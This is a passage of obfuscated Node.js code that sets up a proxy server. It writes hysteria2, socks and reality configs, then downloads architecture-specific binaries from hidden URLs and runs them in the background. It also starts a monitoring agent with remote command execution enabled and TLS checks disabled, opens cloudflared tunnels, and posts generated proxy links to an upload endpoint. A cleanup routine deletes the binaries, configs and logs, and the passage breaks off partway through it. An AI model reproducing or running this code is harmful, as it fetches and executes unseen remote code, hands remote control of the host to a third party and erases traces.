          network: _0x26e231(_0xa9b614._0x11f41e),
          hysteriaSettings: { version: 0x2, masquerade: { type: _0x26e231(0x156), url: _0x26e231(_0xa9b614._0x3d4bcf) } },
          security: _0x26e231(_0xa9b614._0x17bd27),
          tlsSettings: { alpn: ['h3'], certificates: [{ certificateFile: certPath, keyFile: keyPath }] }
        }
      }),
    isValidPort(S5_PORT) &&
      _0x1c4834[_0x26e231(_0xa9b614._0x2ab855)][_0x26e231(0x1e8)]({
        tag: 's5-in',
        listen: '::',
        port: parseInt(S5_PORT),
        protocol: 'socks',
        settings: {
          auth: _0x26e231(_0xa9b614._0x3c9f5d),
          accounts: [{ user: UUID[_0x26e231(_0xa9b614._0x4c7c6)](0x0, 0x8), pass: UUID[_0x26e231(0x1b1)](-0xc) }],
          udp: !![]
        }
      }),
    fs[_0x26e231(_0xa9b614._0xadddb)](path[_0x26e231(_0xa9b614._0x3a73b1)](FILE_PATH, 'config.json'), JSON[_0x26e231(0x1e3)](_0x1c4834, null, 0x2)))
}
function getSystemArchitecture() {
  const _0x2a3911 = { _0x3dc07f: 0x19c, _0x55e6ba: 0x1cc, _0x1268f1: 0x113, _0x4fde85: 0x128 },
    _0x47c4e8 = _0x5c9a9f,
    _0x540475 = os['arch']()
  return _0x540475 === 'arm' || _0x540475 === _0x47c4e8(_0x2a3911._0x3dc07f) || _0x540475 === _0x47c4e8(_0x2a3911._0x55e6ba)
    ? _0x47c4e8(_0x2a3911._0x1268f1)
    : _0x47c4e8(_0x2a3911._0x4fde85)
}
function downloadFile(_0x27f5c7, _0xf352af, _0x3929c6) {
  const _0x1a39d3 = { _0x15b147: 0x158, _0x1bb979: 0xe9 },
    _0x450a64 = { _0x3f8c34: 0x106, _0x4b6bb3: 0x1b2, _0x21c2a8: 0x13d },
    _0x24061f = { _0x3c081b: 0x12b },
    _0x3caf1f = { _0x41fb0f: 0x1f7 },
    _0x296a6f = _0x5c9a9f,
    _0x5a9f2e = _0x27f5c7,
    _0x36dcb9 = _0x5a9f2e + _0x296a6f(0xfd)
  !fs['existsSync'](FILE_PATH) && fs[_0x296a6f(0x1a9)](FILE_PATH, { recursive: !![] })
  const _0x276725 = fs['createWriteStream'](_0x36dcb9)
  axios({ method: _0x296a6f(_0x1a39d3._0x15b147), url: _0xf352af, responseType: 'stream' })
    [_0x296a6f(_0x1a39d3._0x1bb979)]((_0x3bb865) => {
      const _0x113f7c = { _0x4b2abb: 0x1b2, _0x2015d9: 0xe1, _0xf3f8fb: 0x19a, _0x17c05b: 0x106 },
        _0x363134 = _0x296a6f
      ;(_0x3bb865[_0x363134(_0x24061f._0x3c081b)]['pipe'](_0x276725),
        _0x276725['on'](_0x363134(0x1a7), () => {
          _0x276725['close']((_0x123f40) => {
            const _0x5762fd = _0x1ecc
            if (_0x123f40) {
              const _0x2f304a = 'Download\x20' + path[_0x5762fd(0x1a2)](_0x5a9f2e) + _0x5762fd(_0x113f7c._0x4b2abb) + _0x123f40['message']
              ;(fs[_0x5762fd(0x106)](_0x36dcb9, () => {}), console[_0x5762fd(0x13d)](_0x2f304a), _0x3929c6(_0x2f304a))
              return
            }
            try {
              fs[_0x5762fd(_0x113f7c._0x2015d9)](_0x36dcb9, _0x5a9f2e)
            } catch (_0x4641ff) {
              const _0x5b4c37 = 'Download\x20' + path['basename'](_0x5a9f2e) + '\x20failed:\x20' + _0x4641ff[_0x5762fd(_0x113f7c._0xf3f8fb)]
              ;(fs[_0x5762fd(_0x113f7c._0x17c05b)](_0x36dcb9, () => {}), console[_0x5762fd(0x13d)](_0x5b4c37), _0x3929c6(_0x5b4c37))
              return
            }
            ;(console[_0x5762fd(0x1e7)]('Download\x20' + path[_0x5762fd(0x1a2)](_0x5a9f2e) + '\x20successfully'), _0x3929c6(null, _0x5a9f2e))
          })
        }),
        _0x276725['on']('error', (_0x490ff9) => {
          const _0x589636 = _0x363134
          fs['unlink'](_0x36dcb9, () => {})
          const _0x3840c1 = _0x589636(_0x3caf1f._0x41fb0f) + path['basename'](_0x5a9f2e) + '\x20failed:\x20' + _0x490ff9[_0x589636(0x19a)]
          ;(console['error'](_0x3840c1), _0x3929c6(_0x3840c1))
        }))
    })
    [_0x296a6f(0x1fb)]((_0x1fa90a) => {
      const _0x4015c8 = _0x296a6f
      fs[_0x4015c8(_0x450a64._0x3f8c34)](_0x36dcb9, () => {})
      const _0x365c34 = 'Download\x20' + path['basename'](_0x5a9f2e) + _0x4015c8(_0x450a64._0x4b6bb3) + _0x1fa90a[_0x4015c8(0x19a)]
      ;(console[_0x4015c8(_0x450a64._0x21c2a8)](_0x365c34), _0x3929c6(_0x365c34))
    })
}
async function downloadFilesAndRun() {
  const _0xef7d4c = {
      _0x2bf895: 0x11c,
      _0x52670c: 0x1e7,
      _0x187048: 0x129,
      _0x3741c1: 0x195,
      _0x50bbee: 0x13d,
      _0xb3e9cf: 0x14a,
      _0x409bc4: 0x17d,
      _0x528e55: 0xed,
      _0x4ff5b2: 0xf5,
      _0x508dd0: 0x206,
      _0x35967f: 0x17f,
      _0x5a37ea: 0x1d2,
      _0x10c282: 0x1f9,
      _0x56c891: 0x151,
      _0x1debbc: 0xf6,
      _0x23b200: 0xed,
      _0x44bae6: 0x1d4,
      _0x447042: 0x189,
      _0x258a7c: 0x1e6,
      _0x22c6b4: 0xe8,
      _0x52137d: 0x1e7,
      _0x212a79: 0x209,
      _0x41ad8a: 0x208,
      _0x2655c6: 0xfb,
      _0x41b3b0: 0x126,
      _0xb31244: 0xea,
      _0x14365d: 0x171
    },
    _0x3ac36f = { _0x39763d: 0xe7, _0x3fe26f: 0x1e7, _0x5d1d15: 0xfe, _0x3a633e: 0x13d, _0x32d01f: 0x1b6 },
    _0x5a7f70 = _0x5c9a9f,
    _0x59c2d9 = getSystemArchitecture(),
    _0x160b75 = getFilesForArchitecture(_0x59c2d9)
  if (_0x160b75[_0x5a7f70(_0xef7d4c._0x2bf895)] === 0x0) {
    console[_0x5a7f70(_0xef7d4c._0x52670c)](_0x5a7f70(_0xef7d4c._0x187048))
    return
  }
  const _0x2cf538 = _0x160b75[_0x5a7f70(0x1eb)]((_0x6770cb) => {
    return new Promise((_0x100d0e, _0x399dd8) => {
      const _0x4eb9bb = (_0x4e8bdc) => {
        const _0x2113fd = { _0x448b8e: 0x1ab },
          _0x19fcec = _0x1ecc
        downloadFile(_0x6770cb['fileName'], _0x6770cb[_0x19fcec(0x1d6)][_0x4e8bdc], (_0x1c089d, _0x5f0abf) => {
          const _0x10c05c = _0x19fcec
          if (!_0x1c089d) {
            _0x100d0e(_0x5f0abf)
            return
          }
          if (_0x4e8bdc + 0x1 < _0x6770cb[_0x10c05c(0x1d6)][_0x10c05c(0x11c)]) {
            ;(console[_0x10c05c(0x1e7)](_0x10c05c(_0x2113fd._0x448b8e) + path['basename'](_0x6770cb[_0x10c05c(0x119)]) + _0x10c05c(0x120)),
              _0x4eb9bb(_0x4e8bdc + 0x1))
            return
          }
          _0x399dd8(_0x1c089d)
        })
      }
      _0x4eb9bb(0x0)
    })
  })
  try {
    await Promise[_0x5a7f70(_0xef7d4c._0x3741c1)](_0x2cf538)
  } catch (_0x394b11) {
    console[_0x5a7f70(_0xef7d4c._0x50bbee)]('Error\x20downloading\x20files:', _0x394b11)
    return
  }
  function _0x21e478(_0x35fb2e) {
    const _0x24817c = _0x5a7f70,
      _0x1a60ba = 0x1fd
    _0x35fb2e[_0x24817c(0x1e9)]((_0x2aa09a) => {
      const _0x10dc23 = _0x24817c
      if (fs[_0x10dc23(0x152)](_0x2aa09a))
        try {
          ;(fs[_0x10dc23(_0x3ac36f._0x39763d)](_0x2aa09a, _0x1a60ba),
            console[_0x10dc23(_0x3ac36f._0x3fe26f)](_0x10dc23(_0x3ac36f._0x5d1d15) + _0x2aa09a + ':\x20' + _0x1a60ba[_0x10dc23(0xe2)](0x8)))
        } catch (_0x473bf8) {
          console[_0x10dc23(_0x3ac36f._0x3a633e)](_0x10dc23(_0x3ac36f._0x32d01f) + _0x2aa09a + ':\x20' + _0x473bf8)
        }
    })
  }
  const _0x6e295d = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath]
  _0x21e478(_0x6e295d)
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const _0x27cfb5 = NEZHA_SERVER[_0x5a7f70(_0xef7d4c._0xb3e9cf)](':') ? NEZHA_SERVER['split'](':')['pop']() : '',
        _0x1454d2 = new Set([_0x5a7f70(_0xef7d4c._0x409bc4), _0x5a7f70(_0xef7d4c._0x528e55), '2096', _0x5a7f70(0x1f8), '2083', '2053']),
        _0x43d769 = _0x1454d2[_0x5a7f70(_0xef7d4c._0x4ff5b2)](_0x27cfb5) ? _0x5a7f70(_0xef7d4c._0x508dd0) : _0x5a7f70(_0xef7d4c._0x35967f),
        _0x524f7e =
          _0x5a7f70(_0xef7d4c._0x5a37ea) +
          NEZHA_KEY +
          '\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20' +
          NEZHA_SERVER +
          _0x5a7f70(0x15e) +
          _0x43d769 +
          _0x5a7f70(_0xef7d4c._0x10c282) +
          UUID
      fs[_0x5a7f70(0xe0)](path[_0x5a7f70(0x173)](FILE_PATH, 'config.yaml'), _0x524f7e)
      const _0x511244 = _0x5a7f70(_0xef7d4c._0x56c891) + phpPath + _0x5a7f70(_0xef7d4c._0x1debbc) + FILE_PATH + _0x5a7f70(0x162)
      try {
        ;(await exec(_0x511244),
          console[_0x5a7f70(0x1e7)](phpName + _0x5a7f70(0x209)),
          await new Promise((_0x41fe5d) => setTimeout(_0x41fe5d, 0x3e8)))
      } catch (_0x30927c) {
        console[_0x5a7f70(0x13d)]('php\x20running\x20error:\x20' + _0x30927c)
      }
    } else {
      let _0x2e4cbe = ''
      const _0x725407 = [
        _0x5a7f70(_0xef7d4c._0x409bc4),
        _0x5a7f70(_0xef7d4c._0x23b200),
        _0x5a7f70(_0xef7d4c._0x44bae6),
        _0x5a7f70(0x1f8),
        _0x5a7f70(_0xef7d4c._0x447042),
        '2053'
      ]
      _0x725407[_0x5a7f70(0x14a)](NEZHA_PORT) && (_0x2e4cbe = _0x5a7f70(_0xef7d4c._0x258a7c))
      const _0x4e7d4f =
        _0x5a7f70(0x151) +
        npmPath +
        _0x5a7f70(0x1e5) +
        NEZHA_SERVER +
        ':' +
        NEZHA_PORT +
        _0x5a7f70(_0xef7d4c._0x22c6b4) +
        NEZHA_KEY +
        '\x20' +
        _0x2e4cbe +
        _0x5a7f70(0xeb)
      try {
        ;(await exec(_0x4e7d4f),
          console[_0x5a7f70(0x1e7)](npmName + _0x5a7f70(0x209)),
          await new Promise((_0x578028) => setTimeout(_0x578028, 0x3e8)))
      } catch (_0x5b6c1b) {
        console[_0x5a7f70(_0xef7d4c._0x50bbee)](_0x5a7f70(0xfa) + _0x5b6c1b)
      }
    }
  } else console[_0x5a7f70(0x1e7)]('NEZHA\x20variable\x20is\x20empty,skip\x20running')
  const _0x1dfad2 = 'nohup\x20' + webPath + _0x5a7f70(0x1af) + FILE_PATH + _0x5a7f70(0x164)
  try {
    ;(await exec(_0x1dfad2),
      console[_0x5a7f70(_0xef7d4c._0x52137d)](webName + _0x5a7f70(_0xef7d4c._0x212a79)),
      await new Promise((_0x4f2a8b) => setTimeout(_0x4f2a8b, 0x3e8)))
  } catch (_0x1bc3de) {
    console['error'](_0x5a7f70(_0xef7d4c._0x41ad8a) + _0x1bc3de)
  }
  if (fs['existsSync'](botPath)) {
    let _0x4a5f11
    if (ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))
      _0x4a5f11 = 'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20' + ARGO_AUTH
    else
      ARGO_AUTH[_0x5a7f70(_0xef7d4c._0x2655c6)](/TunnelSecret/)
        ? (_0x4a5f11 = _0x5a7f70(0x1be) + path[_0x5a7f70(0x133)](FILE_PATH, 'tunnel.yml') + _0x5a7f70(_0xef7d4c._0x41b3b0))
        : (_0x4a5f11 = _0x5a7f70(0x101) + path[_0x5a7f70(0x133)](bootLogPath) + _0x5a7f70(_0xef7d4c._0xb31244) + ARGO_PORT)
    try {
      ;(await exec(_0x5a7f70(0x202) + path[_0x5a7f70(0x133)](botPath) + '\x22\x20' + _0x4a5f11 + _0x5a7f70(0x1c3)),
        console['log'](botName + _0x5a7f70(0x209)),
        await new Promise((_0x455149) => setTimeout(_0x455149, 0x7d0)))
    } catch (_0x92bdb2) {
      console[_0x5a7f70(0x13d)](_0x5a7f70(_0xef7d4c._0x14365d) + _0x92bdb2)
    }
  }
  await new Promise((_0xdd7c54) => setTimeout(_0xdd7c54, 0x1388))
}
function getFilesForArchitecture(_0x17bee7) {
  const _0x2d61c5 = { _0x56b4d8: 0x1d3, _0x25334a: 0x1a6, _0x12703b: 0x18e, _0x14504c: 0xff, _0x8dffb1: 0x19f, _0x298246: 0x139 },
    _0x288d8d = _0x5c9a9f,
    _0x49c412 = _0x17bee7 === 'arm' ? _0x288d8d(0x102) : _0x288d8d(_0x2d61c5._0x56b4d8),
    _0x2189f7 = _0x17bee7 === 'arm' ? _0x288d8d(_0x2d61c5._0x25334a) : _0x288d8d(_0x2d61c5._0x12703b),
    _0x503abc = [
      { fileName: webPath, fileUrls: [_0x49c412 + _0x288d8d(_0x2d61c5._0x14504c), _0x2189f7 + '/web'] },
      { fileName: botPath, fileUrls: [_0x49c412 + _0x288d8d(_0x2d61c5._0x8dffb1), _0x2189f7 + '/bot'] }
    ]
  return (
    NEZHA_SERVER &&
      NEZHA_KEY &&
      (NEZHA_PORT
        ? _0x503abc[_0x288d8d(0x105)]({ fileName: npmPath, fileUrls: [_0x49c412 + '/agent', _0x2189f7 + '/agent'] })
        : _0x503abc[_0x288d8d(0x105)]({ fileName: phpPath, fileUrls: [_0x49c412 + _0x288d8d(_0x2d61c5._0x298246), _0x2189f7 + _0x288d8d(0x139)] })),
    _0x503abc
  )
}
function argoType() {
  const _0x349c88 = { _0x3a29f6: 0x1e7, _0x3c4091: 0x1bb, _0xcfbc4f: 0x173, _0x23c3af: 0x17b, _0x858975: 0xe0, _0x89e14d: 0x157 },
    _0x53e9b3 = _0x5c9a9f
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console[_0x53e9b3(_0x349c88._0x3a29f6)](_0x53e9b3(0x135))
    return
  }
  if (ARGO_AUTH[_0x53e9b3(0x14a)](_0x53e9b3(_0x349c88._0x3c4091))) {
    fs[_0x53e9b3(0xe0)](path[_0x53e9b3(_0x349c88._0xcfbc4f)](FILE_PATH, 'tunnel.json'), ARGO_AUTH)
    const _0x36bf2e =
      _0x53e9b3(0x18c) +
      ARGO_AUTH[_0x53e9b3(0x159)]('\x22')[0xb] +
      _0x53e9b3(0x138) +
      path[_0x53e9b3(_0x349c88._0xcfbc4f)](FILE_PATH, _0x53e9b3(_0x349c88._0x23c3af)) +
      _0x53e9b3(0x16e) +
      ARGO_DOMAIN +
      _0x53e9b3(0x180) +
      ARGO_PORT +
      _0x53e9b3(0xf9)
    fs[_0x53e9b3(_0x349c88._0x858975)](path['join'](FILE_PATH, 'tunnel.yml'), _0x36bf2e)
  } else console[_0x53e9b3(_0x349c88._0x3a29f6)](_0x53e9b3(0x18f) + ARGO_PORT + _0x53e9b3(_0x349c88._0x89e14d))
}
async function waitForQuickTunnelLog(_0x534d56 = 0x7530) {
  const _0x51c17b = _0x5c9a9f,
    _0x46c6b5 = Date['now']() + _0x534d56
  while (Date[_0x51c17b(0xf4)]() < _0x46c6b5) {
    try {
      if (fs[_0x51c17b(0x152)](bootLogPath)) {
        const _0x180121 = fs[_0x51c17b(0x12c)](bootLogPath, 'utf-8')
        if (/trycloudflare\.com/[_0x51c17b(0x196)](_0x180121)) return _0x180121
      }
    } catch (_0x1206d5) {}
    await new Promise((_0x1f9d40) => setTimeout(_0x1f9d40, 0x3e8))
  }
  return ''
}
async function extractDomains() {
  const _0x4e8a45 = {
      _0x38d353: 0x159,
      _0x360d2f: 0x1e9,
      _0x13517b: 0x1e7,
      _0x413fa4: 0xf3,
      _0x3b86af: 0xea,
      _0x355e79: 0x202,
      _0xa56bea: 0x1c3,
      _0x5652b9: 0x209,
      _0x14729e: 0x13d,
      _0x68c0e7: 0x171,
      _0x51b0cc: 0x13d,
      _0x598ce2: 0x204
    },
    _0x184fca = { _0x57e6c4: 0x1ba },
    _0x34f82e = _0x5c9a9f
  let _0x64db0a
  if (ARGO_AUTH && ARGO_DOMAIN) ((_0x64db0a = ARGO_DOMAIN), console['log'](_0x34f82e(0x166), _0x64db0a), await generateLinks(_0x64db0a))
  else
    try {
      const _0x5d9206 = await waitForQuickTunnelLog(),
        _0x1372e1 = _0x5d9206[_0x34f82e(_0x4e8a45._0x38d353)]('\x0a'),
        _0x155ef8 = []
      _0x1372e1[_0x34f82e(_0x4e8a45._0x360d2f)]((_0x1d955a) => {
        const _0x13e5f2 = _0x1d955a['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/)
        if (_0x13e5f2) {
          const _0x39b6a5 = _0x13e5f2[0x1]
          _0x155ef8['push'](_0x39b6a5)
        }
      })
      if (_0x155ef8['length'] > 0x0)
        ((_0x64db0a = _0x155ef8[0x0]), console[_0x34f82e(_0x4e8a45._0x13517b)](_0x34f82e(0x194), _0x64db0a), await generateLinks(_0x64db0a))
      else {
        ;(console[_0x34f82e(_0x4e8a45._0x13517b)](_0x34f82e(0x132)),
          fs['unlinkSync'](path[_0x34f82e(0x173)](FILE_PATH, _0x34f82e(_0x4e8a45._0x413fa4))))
        async function _0x5c8024() {
          const _0x588534 = _0x34f82e
          try {
            process[_0x588534(0x1b8)] === _0x588534(0x122)
              ? await exec(_0x588534(0x1a5) + botName + _0x588534(0x1b3))
              : await exec(_0x588534(_0x184fca._0x57e6c4) + botName[_0x588534(0x13c)](0x0) + ']' + botName[_0x588534(0x137)](0x1) + _0x588534(0x14d))
          } catch (_0x43af6b) {}
        }
        ;(_0x5c8024(), await new Promise((_0x445b64) => setTimeout(_0x445b64, 0xbb8)))
        const _0x545fcb = _0x34f82e(0x101) + path[_0x34f82e(0x133)](bootLogPath) + _0x34f82e(_0x4e8a45._0x3b86af) + ARGO_PORT
        try {
          ;(await exec(_0x34f82e(_0x4e8a45._0x355e79) + path[_0x34f82e(0x133)](botPath) + '\x22\x20' + _0x545fcb + _0x34f82e(_0x4e8a45._0xa56bea)),
            console[_0x34f82e(0x1e7)](botName + _0x34f82e(_0x4e8a45._0x5652b9)),
            await new Promise((_0x18ba58) => setTimeout(_0x18ba58, 0x1770)),
            await extractDomains())
        } catch (_0x334eb0) {
          console[_0x34f82e(_0x4e8a45._0x14729e)](_0x34f82e(_0x4e8a45._0x68c0e7) + _0x334eb0)
        }
      }
    } catch (_0x3a618d) {
      console[_0x34f82e(_0x4e8a45._0x51b0cc)](_0x34f82e(_0x4e8a45._0x598ce2), _0x3a618d)
    }
}
async function getMetaInfo() {
  const _0xda7af = {
      _0x4c0f88: 0x144,
      _0x59e01b: 0x12b,
      _0x590527: 0x124,
      _0x1da03d: 0x1a1,
      _0x455975: 0x15f,
      _0xb0532b: 0x12b,
      _0x5a9a20: 0x146,
      _0x4c9578: 0x15d
    },
    _0x465652 = _0x5c9a9f
  try {
    const _0x3a33c4 = await axios[_0x465652(0x158)](_0x465652(_0xda7af._0x4c0f88), { headers: { 'User-Agent': _0x465652(0x149), timeout: 0xbb8 } })
    if (_0x3a33c4[_0x465652(_0xda7af._0x59e01b)] && _0x3a33c4[_0x465652(_0xda7af._0x59e01b)][_0x465652(0x186)] && _0x3a33c4['data']['isp'])
      return (_0x3a33c4['data'][_0x465652(0x186)] + '-' + _0x3a33c4[_0x465652(0x12b)]['isp'])[_0x465652(_0xda7af._0x590527)](/\s+/g, '_')
  } catch (_0x3d2541) {
    try {
      const _0x35682a = await axios['get'](_0x465652(_0xda7af._0x1da03d), { headers: { 'User-Agent': 'Mozilla/5.0', timeout: 0xbb8 } })
      if (
        _0x35682a['data'] &&
        _0x35682a[_0x465652(0x12b)]['status'] === _0x465652(0x163) &&
        _0x35682a[_0x465652(_0xda7af._0x59e01b)][_0x465652(_0xda7af._0x455975)] &&
        _0x35682a[_0x465652(0x12b)][_0x465652(0x146)]
      )
        return (_0x35682a[_0x465652(_0xda7af._0xb0532b)][_0x465652(0x15f)] + '-' + _0x35682a['data'][_0x465652(_0xda7af._0x5a9a20)])['replace'](
          /\s+/g,
          '_'
        )
    } catch (_0x19da93) {}
  }
  return _0x465652(_0xda7af._0x4c9578)
}
async function getServerIP() {
  const _0xf585e2 = { _0x3447b9: 0x158, _0x9a6660: 0x1f3, _0x7845d2: 0x1f0, _0x2cdfe9: 0x13d },
    _0x4f43f9 = _0x5c9a9f
  let _0x598f59 = ''
  try {
    const _0x41e718 = await axios[_0x4f43f9(_0xf585e2._0x3447b9)](_0x4f43f9(_0xf585e2._0x9a6660), { timeout: 0xbb8 })
    _0x598f59 = _0x41e718['data'][_0x4f43f9(0x1f0)]()
  } catch (_0x116c09) {
    try {
      _0x598f59 = execSync(_0x4f43f9(0x176))['toString']()[_0x4f43f9(_0xf585e2._0x7845d2)]()
    } catch (_0x4196e2) {
      try {
        const _0x11ccd8 = await axios[_0x4f43f9(_0xf585e2._0x3447b9)]('http://ipv6.ip.sb', { timeout: 0xbb8 })
        _0x598f59 = '[' + _0x11ccd8[_0x4f43f9(0x12b)][_0x4f43f9(0x1f0)]() + ']'
      } catch (_0x20214e) {
        try {
          _0x598f59 = '[' + execSync('curl\x20-sm\x203\x20ipv6.ip.sb')[_0x4f43f9(0xe2)]()[_0x4f43f9(0x1f0)]() + ']'
        } catch (_0x259bb0) {
          console[_0x4f43f9(_0xf585e2._0x2cdfe9)](_0x4f43f9(0x10e), _0x259bb0[_0x4f43f9(0x19a)])
        }
      }
    }
  }
  return _0x598f59
}
async function generateLinks(_0x6b1271) {
  const _0x189732 = await getMetaInfo(),
    _0x49336b = NAME ? NAME + '-' + _0x189732 : _0x189732,
    _0x47238f = await getServerIP()
  return new Promise((_0x252186) => {
    const _0x3fa9d2 = {
      _0x72f754: 0xe6,
      _0x5b8be3: 0x207,
      _0x38a56f: 0x140,
      _0x3fbc32: 0x1b0,
      _0x7dc612: 0x150,
      _0x352195: 0x12f,
      _0x23f8ca: 0x184,
      _0x454cdc: 0x199,
      _0x9fdbce: 0x167,
      _0x13eb65: 0x140,
      _0x187ddd: 0x107,
      _0x58b23b: 0x137,
      _0x21591f: 0x1b1,
      _0x5eb858: 0xf0,
      _0x389968: 0xe2,
      _0x5d29cd: 0xe0,
      _0x2ad60b: 0x143,
      _0x1e7cb4: 0x1e7,
      _0x40bd2d: 0x118,
      _0x551ba2: 0xe2
    }
    setTimeout(() => {
      const _0x1793dd = _0x1ecc,
        _0x10db60 = {
          v: '2',
          ps: '' + _0x49336b,
          add: CFIP,
          port: CFPORT,
          id: UUID,
          aid: '0',
          scy: _0x1793dd(0xdf),
          net: 'ws',
          type: _0x1793dd(0x17a),
          host: _0x6b1271,
          path: _0x1793dd(_0x3fa9d2._0x72f754),
          tls: _0x1793dd(0x1ee),
          sni: _0x6b1271,
          alpn: '',
          fp: _0x1793dd(_0x3fa9d2._0x5b8be3)
        }
      let _0x1ff60d =
        _0x1793dd(_0x3fa9d2._0x38a56f) +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        _0x1793dd(_0x3fa9d2._0x3fbc32) +
        _0x6b1271 +
        _0x1793dd(0x1ec) +
        _0x6b1271 +
        _0x1793dd(_0x3fa9d2._0x7dc612) +
        _0x49336b +
        '\x0a\x0avmess://' +
        Buffer[_0x1793dd(0x107)](JSON['stringify'](_0x10db60))['toString']('base64') +
        _0x1793dd(_0x3fa9d2._0x352195) +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        _0x1793dd(_0x3fa9d2._0x23f8ca) +
        _0x6b1271 +
        '&fp=firefox&type=ws&host=' +
        _0x6b1271 +
        _0x1793dd(_0x3fa9d2._0x454cdc) +
        _0x49336b +
        _0x1793dd(_0x3fa9d2._0x9fdbce)
      if (isValidPort(HY2_PORT)) {
        const _0x27e4f1 = getCertificateFingerprint(certPath),
          _0x453216 = _0x27e4f1 ? _0x1793dd(0x18b) + encodeURIComponent(_0x27e4f1) : '',
          _0x597a79 = _0x1793dd(0x14c) + UUID + '@' + _0x47238f + ':' + HY2_PORT + _0x1793dd(0x13e) + _0x453216 + '#' + _0x49336b
        _0x1ff60d += _0x597a79
      }
      if (isValidPort(REALITY_PORT)) {
        const _0x1c81d5 =
          _0x1793dd(_0x3fa9d2._0x13eb65) +
          UUID +
          '@' +
          _0x47238f +
          ':' +
          REALITY_PORT +
          '?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=' +
          publicKey +
          _0x1793dd(0xe4) +
          _0x49336b
        _0x1ff60d += _0x1c81d5
      }
      if (isValidPort(S5_PORT)) {
        const _0xe60ff2 = Buffer[_0x1793dd(_0x3fa9d2._0x187ddd)](
            UUID[_0x1793dd(_0x3fa9d2._0x58b23b)](0x0, 0x8) + ':' + UUID[_0x1793dd(_0x3fa9d2._0x21591f)](-0xc)
          )[_0x1793dd(0xe2)](_0x1793dd(_0x3fa9d2._0x5eb858)),
          _0x382426 = _0x1793dd(0x104) + _0xe60ff2 + '@' + _0x47238f + ':' + S5_PORT + '#' + _0x49336b
        _0x1ff60d += _0x382426
      }
      ;(console['log'](Buffer[_0x1793dd(0x107)](_0x1ff60d)[_0x1793dd(_0x3fa9d2._0x389968)](_0x1793dd(_0x3fa9d2._0x5eb858))),
        fs[_0x1793dd(_0x3fa9d2._0x5d29cd)](subPath, Buffer['from'](_0x1ff60d)[_0x1793dd(0xe2)](_0x1793dd(0xf0))),
        fs[_0x1793dd(0xe0)](listPath, _0x1ff60d, _0x1793dd(_0x3fa9d2._0x2ad60b)),
        console[_0x1793dd(_0x3fa9d2._0x1e7cb4)](FILE_PATH + _0x1793dd(_0x3fa9d2._0x40bd2d)),
        (subContent = Buffer[_0x1793dd(_0x3fa9d2._0x187ddd)](_0x1ff60d)[_0x1793dd(_0x3fa9d2._0x551ba2)](_0x1793dd(_0x3fa9d2._0x5eb858))),
        uploadNodes(),
        _0x252186(_0x1ff60d))
    }, 0x7d0)
  })
}
async function uploadNodes() {
  const _0x359a6b = {
      _0x150b6d: 0x1f2,
      _0x3fb801: 0x1e7,
      _0xeab33: 0x100,
      _0x561658: 0x1c4,
      _0x1b81ed: 0x12c,
      _0x25b876: 0x182,
      _0x28f1f2: 0x11c,
      _0xf3bcd5: 0x1c4,
      _0x484dad: 0x1e1
    },
    _0xea3227 = _0x5c9a9f
  if (UPLOAD_URL && PROJECT_URL) {
    const _0x361978 = PROJECT_URL + '/' + SUB_PATH,
      _0x430453 = { subscription: [_0x361978] }
    try {
      const _0x16b635 = await axios[_0xea3227(0x114)](UPLOAD_URL + '/api/add-subscriptions', _0x430453, {
        headers: { 'Content-Type': _0xea3227(_0x359a6b._0x150b6d) }
      })
      return _0x16b635 && _0x16b635['status'] === 0xc8 ? (console[_0xea3227(_0x359a6b._0x3fb801)](_0xea3227(_0x359a6b._0xeab33)), _0x16b635) : null
    } catch (_0x10542c) {
      if (_0x10542c[_0xea3227(0x16f)]) {
        if (_0x10542c[_0xea3227(0x16f)][_0xea3227(_0x359a6b._0x561658)] === 0x190) {
        }
      }
    }
  } else {
    if (UPLOAD_URL) {
      if (!fs[_0xea3227(0x152)](listPath)) return
      const _0xaf484 = fs[_0xea3227(_0x359a6b._0x1b81ed)](listPath, _0xea3227(_0x359a6b._0x25b876)),
        _0x7edac = _0xaf484[_0xea3227(0x159)]('\x0a')[_0xea3227(0x136)]((_0x49b13e) => /(vless|vmess|trojan|hysteria2|socks):\/\//['test'](_0x49b13e))
      if (_0x7edac[_0xea3227(_0x359a6b._0x28f1f2)] === 0x0) return
      const _0x508fb2 = JSON[_0xea3227(0x1e3)]({ nodes: _0x7edac })
      try {
        const _0x347c14 = await axios['post'](UPLOAD_URL + _0xea3227(0x15c), _0x508fb2, { headers: { 'Content-Type': _0xea3227(0x1f2) } })
        return _0x347c14 && _0x347c14[_0xea3227(_0x359a6b._0xf3bcd5)] === 0xc8
          ? (console[_0xea3227(_0x359a6b._0x3fb801)](_0xea3227(_0x359a6b._0x484dad)), _0x347c14)
          : null
      } catch (_0x37536d) {
        return null
      }
    } else return
  }
}
function cleanFiles() {
  const _0x27d8e9 = { _0xefbdc3: 0x1e8, _0x167a8d: 0x1e8, _0x4dd03c: 0x1b8, _0x500567: 0x10c, _0x44bf27: 0x173, _0x43882c: 0x205 },
    _0x2f0cc0 = { _0x56b317: 0x1b4 }
  setTimeout(() => {
    const _0xb133a = { _0x16c638: 0x1b4, _0x1e498d: 0x16c },
      _0x420463 = _0x1ecc,
      _0xe37e6b = [bootLogPath, configPath, webPath, botPath, listPath, certPath, keyPath]
    if (NEZHA_PORT) _0xe37e6b[_0x420463(_0x27d8e9._0xefbdc3)](npmPath)
    else NEZHA_SERVER && NEZHA_KEY && _0xe37e6b[_0x420463(_0x27d8e9._0x167a8d)](phpPath)
    process[_0x420463(_0x27d8e9._0x4dd03c)] === 'win32'
      ? exec(_0x420463(0x103) + _0xe37e6b[_0x420463(0x173)]('\x20') + _0x420463(_0x27d8e9._0x500567), (_0x2cab90) => {
          const _0x353aa7 = _0x420463
